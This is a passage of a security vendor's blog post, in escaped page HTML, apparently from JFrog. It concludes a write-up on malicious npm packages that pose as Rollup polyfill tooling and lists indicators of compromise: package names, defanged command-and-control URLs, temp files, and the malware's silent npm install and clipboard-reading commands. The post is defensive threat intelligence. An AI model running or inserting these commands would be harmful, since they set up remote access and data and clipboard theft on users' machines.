tabindex=\"-1\"\u003EConclusion\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThis campaign is effective because each layer appears ordinary when viewed on its own. The entry package looks like Rollup polyfill infrastructure. The second-stage package looks like an SVG utility. The JSONKeeper response appears to be structured data. Only after following the full chain does the real behavior become clear: remote access, browser and wallet theft, file collection, and clipboard monitoring.\u003C\u002Fp\u003E\n\u003Cp\u003ELookalike build dependencies deserve careful review even when the name is not an obvious typo. A copied README, a trusted repository link, and functional-looking package code can be enough to hide a serious compromise.\u003C\u002Fp\u003E\n\u003Cp\u003EThese malicious packages are detected by JFrog Xray and JFrog Curation.\u003C\u002Fp\u003E\n\u003Ch2 id=\"iocs\"\u003E\u003Ca href=\"#iocs\" aria-hidden=\"true\" tabindex=\"-1\"\u003EIOCs\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Ch3 id=\"package-iocs\"\u003E\u003Ca href=\"#package-iocs\" aria-hidden=\"true\" tabindex=\"-1\"\u003EPackage IOCs\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth align=\"left\"\u003EPackage\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EType\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EXray ID\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003Erollup-packages-polyfill-core\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Enpm\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1008625\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003Erollup-runtime-polyfill-core\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Enpm\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1008531\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003Eswift-parse-stream\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Enpm\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1005725\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003Equirky-token\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Enpm\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1003392\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003Erollup-plugin-polyfill-connect\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Enpm\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-973019\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003Ereact-icon-svgs\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003Enpm\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-1011624\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\n\u003C\u002Ftable\u003E\n\u003Ch3 id=\"network-indicators\"\u003E\u003Ca href=\"#network-indicators\" aria-hidden=\"true\" tabindex=\"-1\"\u003ENetwork Indicators\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Ehxxps[:]\u002F\u002Fwww[.]jsonkeeper[.]com\u002Fb\u002F3P9BF\nhxxp[:]\u002F\u002F216[.]126[.]236[.]244\u002Fapi\u002Fservice\u002F98cb54c0b4ac259d30c9c1ca1ae87c68\nhxxp[:]\u002F\u002F216[.]126[.]236[.]244\u002Fapi\u002Fservice\u002Fmakelog\nhxxp[:]\u002F\u002F216[.]126[.]236[.]244\u002Fapi\u002Fservice\u002Fprocess\u002F\nhxxp[:]\u002F\u002F216[.]126[.]236[.]244:4801\nhxxp[:]\u002F\u002F216[.]126[.]236[.]244:4806\u002Fupload\nhxxp[:]\u002F\u002F216[.]126[.]236[.]244:4809\u002Fupload\nhxxp[:]\u002F\u002F216[.]126[.]236[.]244:4809\u002Fcldbs\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch3 id=\"host-indicators\"\u003E\u003Ca href=\"#host-indicators\" aria-hidden=\"true\" tabindex=\"-1\"\u003EHost Indicators\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003E&#x3C;tmp\u003E\u002Fscdata\n&#x3C;tmp\u003E\u002Fldata\nnode pack\nnode scdata\nnode ldata\nvhost.ctl\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch3 id=\"command-and-behavior-indicators\"\u003E\u003Ca href=\"#command-and-behavior-indicators\" aria-hidden=\"true\" tabindex=\"-1\"\u003ECommand And Behavior Indicators\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-text\"\u003Enpm install swift-parse-stream --no-save --silent --no-audit --no-fund\nnpm install quirky-token --no-save --silent --no-audit --no-fund\nnpm install axios socket.io-client --no-warnings --no-progress --loglevel silent\nnpm i axios socket.io-client --no-warnings --no-save --no-progress --loglevel silent\nnpm i axios socket.io-client --no-warnings --no-save --no-progress --loglevel silent &#x26;&#x26; node scdata\nnpm i axios &#x26;&#x26; node ldata\nnpm install socket.io-client ssh2 node-pty@1.0.0 --no-warnings --no-progress --loglevel silent\nnpm install socket.io-client ssh2 node-pty --no-warnings --no-progress --loglevel silent\nnpm install -g socket.io-client --save --no-warnings --no-save --no-progress --loglevel silent\nnpm install sharp screenshot-desktop clipboardy @nut-tree-fork\u002Fnut-js --no-warnings --no-progress --loglevel silent\npbpaste\npowershell -NoProfile -NonInteractive Get-Clipboard\npowershell -NoProfile -Command \"Get-CimInstance Win32_LogicalDisk | Select-Object -ExpandProperty DeviceID\"\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n","excerpt":"JFrog Security Research identified malicious npm packages masquerading as Rollup polyfill tooling and leading to a multi-stage JavaScript payload.","minutes":"9","schema":"","canonical":""}},"context":{}};(function(){var s;(s=document.currentScript||document.scripts[document.scripts.length-1]).parentNode.removeChild(s);}());</script><script src="/assets/js/app.679c50b3.js" defer></script><script src="/assets/js/page--src--templates--real-time-post-vue.1e9339a1.js" defer></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8" data-body="true">
+    if (window.airgap) {
+      const cookieSettings = document.getElementById('cookie_settings') || document.querySelector('.ot-sdk-show-settings');
+      cookieSettings.href = "#";
+      cookieSettings.target = "_self";
+      cookieSettings.onclick = () => {
+        transcend.showConsentManager({ viewState: 'CompleteOptions' });
+      };
+    }
+  </script>
+  </body>
+</html>
